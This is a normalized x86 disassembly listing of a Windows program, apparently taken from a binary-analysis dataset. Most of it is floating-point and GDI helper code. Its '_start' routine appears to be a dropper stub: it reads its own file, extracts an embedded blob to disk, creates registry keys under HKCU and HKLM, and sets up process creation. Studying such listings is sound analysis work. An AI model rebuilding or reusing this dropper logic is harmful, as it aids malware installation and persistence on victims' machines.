sub_4585b4
push eax
fnstsw ax
and eax 0x3800
je r-xdata
fxch st1
sub esp 0xc
fstp [ esp ]
fild [ esp + 0x14 ]
call sub_458409
fld [ esp ]
fxch st1
add esp 0xc
pop eax
retn 0x4
fild [ esp + 0x8 ]
call sub_458409
pop eax
retn 0x4
sub_4585e8
push eax
fnstsw ax
and eax 0x3800
je r-xdata
fxch st1
sub esp 0xc
fstp [ esp ]
fild [ esp + 0x14 ]
call sub_458409
fld [ esp ]
fxch st1
add esp 0xc
pop eax
retn 0x4
fild [ esp + 0x8 ]
call sub_458409
pop eax
retn 0x4
sub_458646
push eax
push ebx
push ecx
mov eax [ esp + 0x16 ]
xor eax 0x700
test eax 0x700
jne r-xdata
fld [ esp + 0x10 ]
fld [ esp + 0x28 ]
fprem
shr eax 0xb
and eax 0xf
cmp [ eax + rw-data ] 0x0
je r-xdata
pop ecx
pop ebx
pop eax
retn
fnstsw [ esp + 0x3c ]
test edx 0x1
je r-xdata
mov eax [ esp + 0x16 ]
and eax 0x7fff0000
cmp eax 0x7fff0000
je r-xdata
mov eax [ esp + 0x3c ]
fxch st1
fstp st0
fld [ esp + 0x1c ]
fxch st1
and eax 0x4300
sub esp 0x1c
fnstenv [ esp ]
and [ esp + 0x4 ] 0xbcff
or [ esp + 0x4 ] eax
fldenv [ esp ]
add esp 0x1c
fnstcw [ esp + 0x34 ]
mov eax [ esp + 0x34 ]
or eax 0x300
mov [ esp + 0x38 ] eax
fldcw [ esp + 0x38 ]
fmul [ rw-data ]
fldcw [ esp + 0x34 ]
mov eax [ esp + 0x2e ]
and eax 0x7fff0000
je r-xdata
cmp eax 0x7fff0000
je r-xdata
mov eax [ esp + 0x2c ]
add eax eax
jne r-xdata
mov eax [ esp + 0x14 ]
add eax eax
jne r-xdata
mov eax [ esp + 0x18 ]
and eax 0x7fff
add eax 0x3f
mov ebx [ esp + 0x30 ]
and ebx 0x7fff
sub ebx eax
ja r-xdata
test edx 0x2
jne r-xdata
mov eax [ esp + 0x18 ]
and eax 0x7fff
add eax 0xa
mov ebx [ esp + 0x30 ]
and ebx 0x7fff
sub ebx eax
js r-xdata
fnstcw [ esp + 0x34 ]
mov eax [ esp + 0x34 ]
or eax 0x33f
mov [ esp + 0x38 ] eax
fldcw [ esp + 0x38 ]
mov eax [ esp + 0x18 ]
and eax 0x7fff
mov ebx [ esp + 0x30 ]
and ebx 0x7fff
sub ebx eax
and ebx 0x3f
or ebx 0x20
add ebx 0x1
mov ecx ebx
mov eax [ esp + 0x18 ]
mov ebx [ esp + 0x30 ]
and ebx 0x7fff
and eax 0x8000
or ebx eax
mov [ esp + 0x18 ] ebx
fld [ esp + 0x10 ]
fabs
fld [ esp + 0x28 ]
fabs
fld [ esp + 0x10 ]
fstp [ esp + 0x1c ]
fld [ esp + 0x28 ]
mov eax [ esp + 0x18 ]
mov ebx [ esp + 0x30 ]
and ebx 0x7fff
mov ecx ebx
sub ebx eax
and ebx 0x7
or ebx 0x4
sub ecx ebx
mov ebx eax
and ebx 0x8000
or ecx ebx
mov [ esp + 0x18 ] ecx
fld [ esp + 0x10 ]
mov [ esp + 0x18 ] eax
fxch st1
fprem
fstp [ esp + 0x28 ]
fstp st0
jmp r-xdata
fxch st1
fmul [ rw-data ]
fxch st1
sub ecx 0x1
jne r-xdata
fsub st1
fcom st1
fnstsw ax
and eax 0x100
jne r-xdata
mov ebx [ esp + 0x30 ]
fstp [ esp + 0x28 ]
fstp st0
fld [ esp + 0x1c ]
fld [ rw-data ]
fprem
fstp st0
fld [ esp + 0x28 ]
fldcw [ esp + 0x34 ]
and ebx 0x8000
je r-xdata
test edx 0x3
je r-xdata
fchs
jmp r-xdata
sub_45884c
push edx
sub esp 0x30
fstp [ esp + 0x18 ]
fstp [ esp ]
xor edx edx
mov eax [ esp + 0x6 ]
test eax 0x7fff0000
je r-xdata
fld [ esp ]
fld [ esp + 0x18 ]
mov eax [ esp ]
or eax [ esp + 0x4 ]
je r-xdata
call sub_458646
add esp 0x30
pop edx
retn
fprem
add esp 0x30
pop edx
retn
fxch st1
fstp [ esp + 0xc ]
fld [ esp ]
fxch st1
or edx 0x2
fnstcw [ esp + 0x24 ]
mov eax [ esp + 0x24 ]
or eax 0x33f
mov [ esp + 0x28 ] eax
fldcw [ esp + 0x28 ]
mov eax [ esp + 0x20 ]
and eax 0x7fff
cmp eax 0x7fbe
ja r-xdata
fnstcw [ esp + 0x24 ]
mov eax [ esp + 0x24 ]
or eax 0x300
mov [ esp + 0x28 ] eax
fldcw [ esp + 0x28 ]
fstp st0
fmul [ rw-data ]
fstp [ esp ]
or edx 0x1
fmul [ rw-data ]
fstp [ esp + 0x18 ]
fmul [ rw-data ]
fstp [ esp ]
jmp r-xdata
fldcw [ esp + 0x24 ]
call sub_458646
add esp 0x30
pop edx
retn
sub_4588fe
push eax
push ebx
push ecx
mov eax [ esp + 0x16 ]
xor eax 0x700
test eax 0x700
jne r-xdata
fld [ esp + 0x10 ]
fld [ esp + 0x28 ]
fprem1
shr eax 0xb
and eax 0xf
cmp [ eax + rw-data ] 0x0
je r-xdata
pop ecx
pop ebx
pop eax
retn
fnstsw [ esp + 0x3c ]
test edx 0x1
je r-xdata
mov eax [ esp + 0x16 ]
and eax 0x7fff0000
cmp eax 0x7fff0000
je r-xdata
mov eax [ esp + 0x3c ]
fxch st1
fstp st0
fld [ esp + 0x1c ]
fxch st1
and eax 0x4300
sub esp 0x1c
fnstenv [ esp ]
and [ esp + 0x4 ] 0xbcff
or [ esp + 0x4 ] eax
fldenv [ esp ]
add esp 0x1c
fnstcw [ esp + 0x34 ]
mov eax [ esp + 0x34 ]
or eax 0x300
mov [ esp + 0x38 ] eax
fldcw [ esp + 0x38 ]
fmul [ rw-data ]
fldcw [ esp + 0x34 ]
mov eax [ esp + 0x2e ]
and eax 0x7fff0000
je r-xdata
cmp eax 0x7fff0000
je r-xdata
mov eax [ esp + 0x2c ]
add eax eax
jne r-xdata
mov eax [ esp + 0x14 ]
add eax eax
jne r-xdata
mov eax [ esp + 0x18 ]
and eax 0x7fff
add eax 0x3f
mov ebx [ esp + 0x30 ]
and ebx 0x7fff
sub ebx eax
ja r-xdata
test ebx 0x2
jne r-xdata
mov eax [ esp + 0x18 ]
and eax 0x7fff
add eax 0xa
mov ebx [ esp + 0x30 ]
and ebx 0x7fff
sub ebx eax
js r-xdata
fnstcw [ esp + 0x34 ]
mov eax [ esp + 0x34 ]
or eax 0x33f
mov [ esp + 0x38 ] eax
fldcw [ esp + 0x38 ]
mov eax [ esp + 0x18 ]
and eax 0x7fff
mov ebx [ esp + 0x30 ]
and ebx 0x7fff
sub ebx eax
and ebx 0x3f
or ebx 0x20
add ebx 0x1
mov ecx ebx
mov eax [ esp + 0x18 ]
mov ebx [ esp + 0x30 ]
and ebx 0x7fff
and eax 0x8000
or ebx eax
mov [ esp + 0x18 ] ebx
fld [ esp + 0x10 ]
fabs
fld [ esp + 0x28 ]
fabs
fld [ esp + 0x10 ]
fstp [ esp + 0x1c ]
fld [ esp + 0x28 ]
mov eax [ esp + 0x18 ]
mov ebx [ esp + 0x30 ]
and ebx 0x7fff
mov ecx ebx
sub ebx eax
and ebx 0x7
or ebx 0x4
sub ecx ebx
mov ebx eax
and ebx 0x8000
or ecx ebx
mov [ esp + 0x18 ] ecx
fld [ esp + 0x10 ]
mov [ esp + 0x18 ] eax
fxch st1
fprem
fstp [ esp + 0x28 ]
fstp st0
jmp r-xdata
fxch st1
fmul [ rw-data ]
fxch st1
sub ecx 0x1
jne r-xdata
fsub st1
fcom st1
fnstsw ax
and eax 0x100
jne r-xdata
mov ebx [ esp + 0x30 ]
fstp [ esp + 0x28 ]
fstp st0
fld [ esp + 0x1c ]
fld [ rw-data ]
fprem1
fstp st0
fld [ esp + 0x28 ]
fldcw [ esp + 0x34 ]
and ebx 0x8000
je r-xdata
test edx 0x3
je r-xdata
fchs
jmp r-xdata
sub_458b04
push edx
sub esp 0x30
fstp [ esp + 0x18 ]
fstp [ esp ]
mov edx 0x0
mov eax [ esp + 0x6 ]
test eax 0x7fff0000
je r-xdata
fld [ esp ]
fld [ esp + 0x18 ]
mov eax [ esp ]
or eax [ esp + 0x4 ]
je r-xdata
call sub_4588fe
add esp 0x30
pop edx
retn
fprem
add esp 0x30
pop edx
retn
fxch st1
fstp [ esp + 0xc ]
fld [ esp ]
fxch st1
or edx 0x2
fnstcw [ esp + 0x24 ]
mov eax [ esp + 0x24 ]
or eax 0x33f
mov [ esp + 0x28 ] eax
fldcw [ esp + 0x28 ]
mov eax [ esp + 0x20 ]
and eax 0x7fff
cmp eax 0x7fbe
ja r-xdata
fnstcw [ esp + 0x24 ]
mov eax [ esp + 0x24 ]
or eax 0x300
mov [ esp + 0x28 ] eax
fldcw [ esp + 0x28 ]
fstp st0
fmul [ rw-data ]
fstp [ esp ]
or edx 0x1
fmul [ rw-data ]
fstp [ esp + 0x18 ]
fmul [ rw-data ]
fstp [ esp ]
jmp r-xdata
fldcw [ esp + 0x24 ]
call sub_4588fe
add esp 0x30
pop edx
retn
sub_458bcb
mov edi edi
push ebx
mov ebx esp
push ecx
push ecx
and esp 0xfffffff0
add esp 0x4
push ebp
mov ebp [ ebx + 0x4 ]
mov [ esp + 0x4 ] ebp
mov ebp esp
sub esp 0x88
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x10 ]
movzx ecx [ eax ]
push esi
mov esi [ ebx + 0xc ]
mov eax [ esi ]
dec eax
push edi
mov [ ebp - 0x88 ] ecx
je r-xdata
mov [ ebp - 0x84 ] 0x8
dec eax
je r-xdata
push 0xffff
push [ ebp - 0x88 ]
call sub_452841
cmp [ esi ] 0x8
pop ecx
pop ecx
je r-xdata
mov eax [ ebx + 0x8 ]
cmp eax 0x10
je r-xdata
mov [ ebp - 0x84 ] 0x4
jmp r-xdata
dec eax
je r-xdata
push [ esi ]
call sub_4524a8
pop ecx
cmp [ rw-data ] 0x0
jne r-xdata
mov ecx [ ebp - 0x40 ]
fld [ esi + 0x10 ]
and ecx 0xffffffe3
fstp [ ebp - 0x50 ]
or ecx 0x3
mov [ ebp - 0x40 ] ecx
cmp eax 0x16
je r-xdata
push ecx
lea edi [ esi + 0x18 ]
push edi
push [ ebp - 0x84 ]
call sub_4522c6
add esp 0xc
test eax eax
jne r-xdata
mov [ ebp - 0x84 ] 0x11
jmp r-xdata
dec eax
je r-xdata
push esi
call sub_451f05
pop ecx
test eax eax
jne r-xdata
cmp eax 0x1d
je r-xdata
mov [ ebp - 0x84 ] 0x12
jmp r-xdata
dec eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_43f96b
mov esp ebp
pop ebp
mov esp ebx
pop ebx
retn
and [ ebp - 0x40 ] 0xfffffffe
jmp r-xdata
dec eax
dec eax
je r-xdata
push edi
lea ecx [ esi + 0x8 ]
push ecx
push eax
push [ ebp - 0x84 ]
lea eax [ ebp - 0x88 ]
push eax
lea eax [ ebp - 0x80 ]
push eax
call sub_4522a3
add esp 0x18
mov [ esi ] 0x1
jmp r-xdata
dec eax
jne r-xdata
mov [ ebp - 0x84 ] 0x10
jmp r-xdata
sub_458d0a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xe ]
mov ecx 0x7ff0
mov edx eax
and edx ecx
cmp dx cx
jne r-xdata
and eax 0x8000
mov ecx eax
test dx dx
jne r-xdata
fld [ ebp + 0x8 ]
push ecx
push ecx
fstp [ esp ]
call sub_452707
dec eax
pop ecx
pop ecx
je r-xdata
fldz
fcomp [ ebp + 0x8 ]
fnstsw ax
test ah 0x44
mov eax ecx
jpe r-xdata
test [ ebp + 0xc ] 0xfffff
jne r-xdata
mov eax 0x200
pop ebp
retn
dec eax
je r-xdata
neg eax
sbb eax eax
and eax 0xffffff08
add eax 0x100
pop ebp
retn
neg eax
sbb eax eax
and eax 0xffffffe0
add eax 0x40
pop ebp
retn
neg eax
sbb eax eax
and eax 0xffffff90
sub eax 0xffffff80
pop ebp
retn
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x4
dec eax
je r-xdata
push 0x2
jmp r-xdata
xor eax eax
inc eax
pop ebp
retn
pop eax
pop ebp
retn
sub_45b670
push esi
push 0x0
call [ GetDC@IAT ]
mov esi eax
push esi
call [ CreateCompatibleDC@IAT ]
push esi
push 0x0
mov [ rw-data ] eax
call [ ReleaseDC@IAT ]
push sub_45b830
call sub_4413c3
add esp 0x4
pop esi
retn
sub_45b740
cmp [ rw-data ] 0x0
mov [ rw-data ] r--data
je r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push ebx
mov ebx rw-data
call sub_419d80
mov [ rw-data ] 0x0
pop ebx
push rw-data
call [ DeleteCriticalSection@IAT ]
mov [ rw-data ] 0x0
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_45b850
mov eax [ rw-data ]
mov ecx [ rw-data ]
push eax
push ecx
call [ SelectObject@IAT ]
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push eax
call [ DeleteObject@IAT ]
test eax eax
je r-xdata
retn
push eax
mov [ rw-data ] 0x0
call [ DeleteDC@IAT ]
mov [ rw-data ] 0x0
sub_45b8a0
cmp [ rw-data ] 0x0
je r-xdata
retn
push esi
mov esi [ rw-data ]
test esi esi
je r-xdata
mov [ rw-data ] 0x0
pop esi
push edi
push 0x7d0
mov edi esi
call sub_42e4b0
test edi edi
je r-xdata
pop edi
mov eax edi
call sub_42e2c0
_start
push ebp
mov ebp esp
sub esp 0x574
mov [ ebp - 0x12c ] 0x0
mov [ ebp - 0x154 ] 0x0
mov [ ebp - 0x284 ] 0x0
call sub_4a227d
nop
nop
pop [ ebp - 0x12c ]
mov eax [ ebp - 0x12c ]
sub eax 0x24c
mov [ ebp - 0x284 ] eax
mov [ ebp - 0x540 ] 0x0
mov [ ebp - 0x2a8 ] 0x0
mov [ ebp - 0x420 ] 0x0
mov [ ebp - 0x144 ] 0x0
mov ecx [ ebp - 0x284 ]
mov edx [ ecx ]
mov [ ebp - 0x420 ] edx
mov eax [ ebp - 0x284 ]
add eax 0x4
mov [ ebp - 0x140 ] eax
mov ecx [ ebp - 0x140 ]
push ecx
call sub_4a2e90
add esp 0x4
call sub_4a3050
mov [ ebp - 0x54c ] eax
mov edx [ ebp - 0x140 ]
push edx
mov eax [ ebp - 0x54c ]
push eax
call sub_4a3080
add esp 0x8
mov [ ebp - 0x540 ] eax
mov ecx [ ebp - 0x284 ]
mov edx [ ecx + 0x1c ]
mov [ ebp - 0x144 ] edx
mov [ ebp - 0x548 ] 0x0
mov [ ebp - 0x53c ] 0x0
mov eax [ ebp - 0x284 ]
add eax 0xa0
mov [ ebp - 0x2a4 ] eax
mov ecx [ ebp - 0x284 ]
add ecx 0x1f0
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x284 ]
add edx 0xd0
mov [ ebp - 0x128 ] edx
mov [ ebp - 0x124 ] 0x0
mov [ ebp - 0x150 ] 0x0
mov eax [ ebp - 0x12c ]
sub eax 0x1
mov [ ebp - 0x12c ] eax
mov ecx [ ebp - 0x12c ]
mov edx [ ecx ]
mov [ ebp - 0x154 ] edx
jmp rwxdata
mov [ ebp - 0x2a0 ] 0x0
mov [ ebp - 0x41c ] 0x0
mov [ ebp - 0x418 ] 0x0
mov [ ebp - 0x13c ] 0x0
mov [ ebp - 0x14c ] 0x0
mov [ ebp - 0x29c ] 0x0
mov [ ebp - 0x538 ] 0x0
mov [ ebp - 0x544 ] 0x0
mov [ ebp - 0x280 ] 0x0
mov [ ebp - 0x28c ] 0x0
mov [ ebp - 0x55c ] 0x0
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x534 ] 0x0
mov [ ebp - 0x268 ] 0x0
mov [ ebp - 0x414 ] 0x0
mov [ ebp - 0x298 ] 0x0
mov edx [ ebp - 0x284 ]
add edx 0x1f0
mov [ ebp - 0x124 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax ]
mov [ ebp - 0x2a0 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x41c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x8 ]
mov [ ebp - 0x418 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0xc ]
mov [ ebp - 0x13c ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x10 ]
mov [ ebp - 0x14c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x14 ]
mov [ ebp - 0x29c ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x18 ]
mov [ ebp - 0x538 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x1c ]
mov [ ebp - 0x544 ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x20 ]
mov [ ebp - 0x280 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x24 ]
mov [ ebp - 0x28c ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x28 ]
mov [ ebp - 0x55c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x2c ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x30 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x34 ]
mov [ ebp - 0x534 ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x38 ]
mov [ ebp - 0x268 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x3c ]
mov [ ebp - 0x414 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x40 ]
mov [ ebp - 0x298 ] eax
mov [ ebp - 0x264 ] 0x0
mov ecx [ ebp - 0x284 ]
add ecx 0x20
mov [ ebp - 0x264 ] ecx
mov [ ebp - 0x2b4 ] 0x0
mov [ ebp - 0x18 ] 0x0
push 0x103
lea edx [ ebp - 0x120 ]
push edx
push 0x0
call [ ebp - 0x41c ]
push 0x0
push 0x0
push 0x3
push 0x0
push 0x1
push 0x80000000
lea eax [ ebp - 0x120 ]
push eax
call [ ebp - 0x418 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0xffffffff
je rwxdata
mov eax [ ebp - 0x548 ]
push eax
call [ ebp - 0x540 ]
mov [ ebp - 0x150 ] eax
cmp [ ebp - 0x150 ] 0x0
jne rwxdata
cmp [ ebp - 0x154 ] 0x652a5e26
je rwxdata
call [ ebp - 0x420 ]
xor eax eax
mov esp ebp
pop ebp
retn
push 0x0
mov ecx [ ebp - 0xc ]
push ecx
call [ ebp - 0x14c ]
mov [ ebp - 0x288 ] eax
cmp [ ebp - 0x288 ] 0xc800000
ja rwxdata
mov ecx [ ebp - 0x128 ]
mov [ ebp - 0x53c ] ecx
mov edx [ ebp - 0x53c ]
movsx eax [ edx ]
test eax eax
je rwxdata
jmp rwxdata
mov ecx [ ebp - 0xc ]
push ecx
call [ ebp - 0x13c ]
push 0x4
push 0x1000
mov edx [ ebp - 0x288 ]
push edx
push 0x0
call [ ebp - 0x29c ]
mov [ ebp - 0x294 ] eax
cmp [ ebp - 0x294 ] 0x0
je rwxdata
mov edx [ ebp - 0x128 ]
add edx 0x5
mov [ ebp - 0x128 ] edx
mov eax [ ebp - 0x548 ]
mov [ ebp - 0x570 ] eax
mov [ ebp - 0x56c ] 0x0
mov ecx [ ebp - 0x53c ]
push ecx
mov edx [ ebp - 0x150 ]
push edx
call sub_4a3080
add esp 0x8
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x560 ] 0x4
push 0x0
lea eax [ ebp - 0x550 ]
push eax
mov ecx [ ebp - 0x288 ]
push ecx
mov edx [ ebp - 0x294 ]
push edx
mov eax [ ebp - 0xc ]
push eax
call [ ebp - 0x544 ]
mov ecx [ ebp - 0x550 ]
mov edx [ ebp - 0x294 ]
lea eax [ edx + ecx - 0x3 ]
mov [ ebp - 0x148 ] eax
jmp rwxdata
mov edx [ ebp - 0x56c ]
mov eax [ ebp - 0x2a4 ]
lea ecx [ eax + edx + 0x1 ]
mov [ ebp - 0x2a4 ] ecx
jmp rwxdata
mov ecx [ ebp - 0x570 ]
movsx edx [ ecx ]
mov eax [ ebp - 0x570 ]
add eax 0x1
mov [ ebp - 0x570 ] eax
test edx edx
je rwxdata
mov edx [ ebp - 0x14 ]
add edx 0x4
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x53c ]
mov [ ebp - 0x568 ] eax
mov [ ebp - 0x564 ] 0x0
mov edx [ ebp - 0x14 ]
add edx [ ebp - 0x560 ]
mov eax [ ebp - 0x560 ]
mov cl [ ebp + eax - 0x124 ]
mov [ edx ] cl
jmp rwxdata
mov edx [ ebp - 0x148 ]
cmp edx [ ebp - 0x294 ]
jbe rwxdata
mov eax [ ebp - 0x2a4 ]
mov [ ebp - 0x548 ] eax
mov ecx [ ebp - 0x548 ]
movsx edx [ ecx ]
test edx edx
je rwxdata
mov ecx [ ebp - 0x56c ]
add ecx 0x1
mov [ ebp - 0x56c ] ecx
jmp rwxdata
mov edx [ ebp - 0x564 ]
mov eax [ ebp - 0x128 ]
lea ecx [ eax + edx + 0x1 ]
mov [ ebp - 0x128 ] ecx
jmp rwxdata
mov ecx [ ebp - 0x568 ]
movsx edx [ ecx ]
mov eax [ ebp - 0x568 ]
add eax 0x1
mov [ ebp - 0x568 ] eax
test edx edx
je rwxdata
mov eax [ ebp - 0x560 ]
mov ecx [ ebp - 0x560 ]
sub ecx 0x1
mov [ ebp - 0x560 ] ecx
test eax eax
je rwxdata
mov eax [ ebp - 0x148 ]
cmp eax [ ebp - 0x294 ]
jbe rwxdata
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x36
jne rwxdata
cmp [ ebp - 0x570 ] 0x0
je rwxdata
mov ecx [ ebp - 0x564 ]
add ecx 0x1
mov [ ebp - 0x564 ] ecx
jmp rwxdata
push 0x8000
push 0x0
mov eax [ ebp - 0x294 ]
push eax
call [ ebp - 0x538 ]
mov ecx [ ebp - 0x148 ]
add ecx 0x4
mov [ ebp - 0x148 ] ecx
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
jmp rwxdata
mov edx [ ebp - 0x148 ]
movsx eax [ edx + 0x1 ]
cmp eax 0x2a
jne rwxdata
cmp [ ebp - 0x568 ] 0x0
je rwxdata
mov ecx [ ebp - 0x148 ]
movsx edx [ ecx ]
cmp edx 0x3a
je rwxdata
mov ecx [ ebp - 0x148 ]
sub ecx 0x1
mov [ ebp - 0x148 ] ecx
mov ecx [ ebp - 0x148 ]
movsx edx [ ecx + 0x2 ]
cmp edx 0x23
jne rwxdata
mov edx [ ebp - 0x130 ]
sub edx 0x1
mov [ ebp - 0x554 ] edx
jmp rwxdata
mov eax [ ebp - 0x130 ]
mov ecx [ ebp - 0x148 ]
mov dl [ ecx ]
mov [ ebp + eax - 0x120 ] dl
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x2e
jne rwxdata
jmp rwxdata
mov ecx [ ebp - 0x554 ]
movsx edx [ ebp + ecx - 0x120 ]
cmp edx 0x2e
je rwxdata
jmp rwxdata
mov [ ebp - 0x554 ] 0x0
jmp rwxdata
mov [ ebp - 0x2b0 ] 0x0
mov eax [ ebp - 0x554 ]
add eax 0x1
mov [ ebp - 0x554 ] eax
jmp rwxdata
jmp rwxdata
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
mov eax [ ebp - 0x148 ]
add eax 0x1
mov [ ebp - 0x148 ] eax
mov eax [ ebp - 0x554 ]
cmp eax [ ebp - 0x130 ]
jae rwxdata
mov eax [ ebp - 0x554 ]
cmp eax [ ebp - 0x130 ]
jae rwxdata
mov eax [ ebp - 0x554 ]
sub eax 0x1
mov [ ebp - 0x554 ] eax
mov ecx [ ebp - 0x554 ]
mov [ ebp + ecx - 0x260 ] 0x0
lea edx [ ebp - 0x260 ]
push edx
call sub_4a2e90
add esp 0x4
push 0x104
lea eax [ ebp - 0x260 ]
push eax
call [ ebp - 0x8 ]
push 0x0
lea ecx [ ebp - 0x260 ]
push ecx
call [ ebp - 0x280 ]
mov ecx [ ebp - 0x554 ]
mov edx [ ebp - 0x554 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x260 ] al
jmp rwxdata
mov ecx [ ebp - 0x2b0 ]
mov [ ebp + ecx - 0x260 ] 0x0
mov edx [ ebp - 0x130 ]
mov [ ebp + edx - 0x120 ] 0x0
lea eax [ ebp - 0x120 ]
push eax
call sub_4a2e90
add esp 0x4
lea ecx [ ebp - 0x260 ]
push ecx
call sub_4a2e90
add esp 0x4
push 0x104
lea edx [ ebp - 0x120 ]
push edx
call [ ebp - 0x8 ]
mov eax [ ebp - 0x148 ]
add eax 0x1
mov [ ebp - 0x148 ] eax
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x2b0 ]
mov edx [ ebp - 0x554 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x260 ] al
jmp rwxdata
mov edx [ ebp - 0x554 ]
add edx 0x1
mov [ ebp - 0x554 ] edx
mov edx [ ebp - 0x130 ]
movsx eax [ ebp + edx - 0x120 ]
test eax eax
je rwxdata
mov ecx [ ebp - 0x554 ]
add ecx 0x1
mov [ ebp - 0x554 ] ecx
mov edx [ ebp - 0x2b0 ]
add edx 0x1
mov [ ebp - 0x2b0 ] edx
mov ecx [ ebp - 0x130 ]
mov [ ebp + ecx - 0x530 ] 0x20
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
mov eax [ ebp - 0x130 ]
mov [ ebp + eax - 0x530 ] 0x2f
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
mov [ ebp - 0x290 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x130 ]
mov edx [ ebp - 0x130 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x530 ] al
jmp rwxdata
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x26
je rwxdata
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
mov ecx [ ebp - 0x130 ]
mov [ ebp + ecx - 0x530 ] 0x0
mov edx [ ebp - 0x148 ]
add edx 0x1
mov [ ebp - 0x148 ] edx
mov eax [ ebp - 0x264 ]
push eax
call sub_4a2e90
add esp 0x4
mov ecx [ ebp - 0x144 ]
and ecx 0x1
je rwxdata
mov edx [ ebp - 0x290 ]
imul edx edx 0xa
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
lea edx [ edx + ecx - 0x30 ]
mov [ ebp - 0x290 ] edx
mov eax [ ebp - 0x130 ]
mov ecx [ ebp - 0x148 ]
mov dl [ ecx ]
mov [ ebp + eax - 0x530 ] dl
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
jmp rwxdata
push 0x0
push 0x80
push 0x2
push 0x0
push 0x1
push 0x40000000
lea eax [ ebp - 0x120 ]
push eax
call [ ebp - 0x418 ]
mov [ ebp - 0x558 ] eax
cmp [ ebp - 0x558 ] 0xffffffff
je rwxdata
mov edx [ ebp - 0x144 ]
and edx 0x10
je rwxdata
mov edx [ ebp - 0x148 ]
add edx 0x1
mov [ ebp - 0x148 ] edx
push 0x37b18
mov ecx [ ebp - 0x148 ]
push ecx
call sub_4a2fc0
add esp 0x8
push 0x0
lea edx [ ebp - 0x550 ]
push edx
push 0x37b18
mov eax [ ebp - 0x148 ]
push eax
mov ecx [ ebp - 0x558 ]
push ecx
call [ ebp - 0x28c ]
mov edx [ ebp - 0x558 ]
push edx
call [ ebp - 0x13c ]
mov eax [ ebp - 0x144 ]
and eax 0x100
je rwxdata
lea eax [ ebp - 0x27c ]
push eax
lea ecx [ ebp - 0x138 ]
push ecx
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
mov edx [ ebp - 0x264 ]
push edx
push 0x80000001
call [ ebp - 0x4 ]
mov [ ebp - 0x2b4 ] eax
lea eax [ ebp - 0x27c ]
push eax
lea ecx [ ebp - 0x138 ]
push ecx
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
mov edx [ ebp - 0x264 ]
push edx
push 0x80000002
call [ ebp - 0x4 ]
mov [ ebp - 0x2b4 ] eax
jmp rwxdata
mov [ ebp - 0x574 ] 0x44
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
mov [ ebp - 0x300 ] 0x44
mov [ ebp - 0x2d4 ] 0x81
mov eax [ ebp - 0x144 ]
and eax 0x1000
je rwxdata
mov ecx [ ebp - 0x574 ]
sub ecx 0x1
mov [ ebp - 0x574 ] ecx
mov edx [ ebp - 0x574 ]
mov [ ebp + edx - 0x300 ] 0x0
jmp rwxdata
cmp [ ebp - 0x130 ] 0xa
jae rwxdata
mov edx 0x5
mov [ ebp - 0x2d0 ] dx
xor ecx ecx
mov [ ebp - 0x2d0 ] cx
jmp rwxdata
cmp [ ebp - 0x574 ] 0x0
je rwxdata
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
lea ecx [ ebp - 0x134 ]
push ecx
lea edx [ ebp - 0x410 ]
push edx
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea ecx [ ebp - 0x260 ]
push ecx
mov edx [ ebp - 0x138 ]
push edx
